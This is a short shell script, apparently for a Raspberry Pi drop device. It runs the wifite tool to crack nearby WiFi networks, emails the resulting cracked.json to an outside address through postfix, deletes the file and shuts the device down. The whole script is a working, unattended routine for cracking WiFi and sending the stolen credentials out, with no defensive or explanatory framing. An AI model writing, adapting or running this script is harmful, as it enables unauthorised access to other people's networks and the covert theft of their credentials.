#!/bin/sh
sleep 30s
wifite -p 60 --kill
systemctl start postfix
sendEmail -f pifi@attcking.pi -t username@email.com -u "Pa$$W0RD$" -a cracked.json
systemctl stop postfix
rm cracked.json
shutdown now